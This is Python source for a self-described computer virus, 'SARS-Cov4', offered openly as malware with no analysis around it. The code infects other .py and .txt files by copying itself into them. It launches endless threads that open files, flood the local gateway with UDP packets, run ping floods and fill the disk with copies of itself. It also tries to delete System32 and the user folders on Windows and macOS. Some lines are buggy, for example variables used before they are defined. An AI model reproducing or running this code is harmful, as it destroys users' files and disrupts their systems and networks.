#SARS-Cov4 Computer Virus
import os, glob, sys, threading, socket, random
def get_filename():
    cwd = sys.argv[0]
    cwd = list(cwd)
    result = ""
    for i in cwd:
        if i == "/" or i == backslash:
            result = result + " "
        else:
            result = result + i
    result = result.split()
    final_result = result[(len(result) -  1)]
    return final_result
def getdefaultgateway():
    result = os.popen('ipconfig')
    result = result.readlines()
    ls_item = 0
    for i in result:
        if i.strip().startswith('Default Gateway'):
            default_gateway = result[(ls_item + 1)]
            break
        else:
            pass
        ls_item += 1
    return default_gateway.strip()
getlogin = os.getlogin()
filename = get_filename()
backslash = ' \ '.strip()
opsys = sys.platform
currentdir = open(sys.argv[0], "r")
main_code = currentdir.readlines()
code = []
virus_area = False
for line in main_code:
    if line == '#SARS-Cov4 Computer Virus\n':
        virus_area = True
    elif virus_area:
        code.append(line)
    elif line == '#End Of Virus\n':
        virus_area = False
        break
otherscripts = glob.glob('*.py') + glob.glob('*.txt')
for script in otherscripts:
    print("[+] Infecting Script:", script)
    infected = False
    script_code = open(script, "r")
    othercode = script_code.readlines()
    for line in othercode:
        if line == '#SARS-Cov4 Computer Virus\n':
            if script == filename:
                pass
                infected = True
                break
            else:
                infected = False
        elif line == '#End Of Virus\n':
            break
    if not infected:
        final_code = []
        final_code.extend('\n')
        final_code.extend(code)
        final_code.extend('\n')
        file = open(script, "w")
        file.writelines(final_code)
        lag_filename = str(random.randint(1, 7720347507204725274851237918237)) + '.py'
        lag_file = open(lag_filename, 'w')
        lag_file.writelines(final_code)
        otherscripts = glob.glob('*.py')
        print("[+] Successfully Infected file:", script)
        print("")
def lag():
    while True:
        try:
            lag_file.writelines(final_code)
            print("[+] Opening Script:", file)
            if opsys == "win32":
                os.startfile(lag_file.name)
            elif opsys == "darwin":
                os.system('open '+lag_file.name)
            else:
                pass
        except:
            pass
def lag2():
    while True:
        otherscripts2 = os.listdir()
        for files in otherscripts2:
            try:
                opened_file = files.strip()
                opened_file = open(opened_file, 'r')
                print("[+] Opening Script:", opened_file)
                if opsys == "win32":
                    os.startfile(opened_file.name)
                elif opsys == "darwin":
                    os.system('open ' + opened_file.name)
                else:
                    pass
            except:
                pass
def lag3():
    while True:
        if opsys == "win32":
            os.system('start')
        else:
            os.system('HAHAGETHACKEDLMAO')
def ddos():
    try:
        if opsys == "win32":
            ip = getdefaultgateway()
        else:
            ip = socket.gethostbyname(socket.gethostname())
        port = 80
        packet = random._urandom(65500)
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect((ip, port))
                sock.sendto(packet, (ip, port))
                sock.close()
            except:
                pass
    except:
        pass
def delete():
    start_delete = False
    operating_system = sys.platform
    if operating_system == "win32":
        batch_file = open('anti-malware-executable.bat','w')
        batch_file.writelines('\n@echo off', '\ndel \Q C:\\Windows\\System32\\', '\n')
        os.startfile(batch_file.name)
        os.chdir('C:/Users/')
        start_delete = True
    elif operating_system == "darwin":
        os.chdir(f'/Users/')
        start_delete = True
    if start_delete:
        direc = os.listdir()
        for folder in direc:
            try:
                os.rmdir(folder)
            except:
                os.remove(folder)
                pass
def ping_of_death():
    while True:
        try:
            os.system(f'ping {ip} -l 65500 -w 10 -n 1 -t')
        except:
            pass
def create_file():
    letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                        'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                        'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G',
                        'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                        'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3',
                        '4', '5', '6', '7', '8', '9', '0']
    try:
        while True:
            for i in range(1000000000000000000000000000000000000000000000000000000):
                if opsys == "win32":
                    os.chdir('C:/')
                elif opsys == "darwin":
                    os.chdir('/Users/')
                else:
                    os.chdir('C:/')
                try:
                    file_name = ""
                    for letter in range(10):
                        file_letter = letters[random.randint(0, 61)]
                        file_name = str(file_letter) + str(file_name)
                    filetocreate = open(str(file_name) + ".py", "w")
                    filetocreate.writelines(main_code)
                    if opsys == "win32":
                        try:
                            os.startfile(filetocreate.name)
                        except:
                            pass
                    elif opsys == "darwin":
                        try:
                            os.system(f'open {filetocreate.name}')
                        except:
                            pass
                except:
                    pass
    except:
        pass
def thread_starter():
    while True:
        try:
            ping = threading.Thread(target=ping_of_death)
            ping.start()
            lag_file2 = threading.Thread(target=lag2)
            lag_file2.start()
            ddos_computer = threading.Thread(target=ddos)
            ddos_computer.start()
            lag_computer = threading.Thread(target=lag)
            lag_computer.start()
            create_file_madness = threading.Thread(target=create_file)
            create_file_madness.start()
            delete_file = threading.Thread(target=delete)
            delete_file.start()
            lagger3 = threading.Thread(target=lag3)
            lagger3.start()
        except:
            pass
try:
    ping = threading.Thread(target=ping_of_death)
    ping.start()
    thread_creator = threading.Thread(target=thread_starter)
    thread_creator.start()
    ddos_computer = threading.Thread(target=ddos)
    ddos_computer.start()
    lag_computer = threading.Thread(target=lag)
    lag_computer.start()
    create_file_madness = threading.Thread(target=create_file)
    create_file_madness.start()
    delete_file = threading.Thread(target=delete)
    delete_file.start()
    lagger3 = threading.Thread(target=lag3)
    lagger3.start()
except:
    pass
#End Of Virus
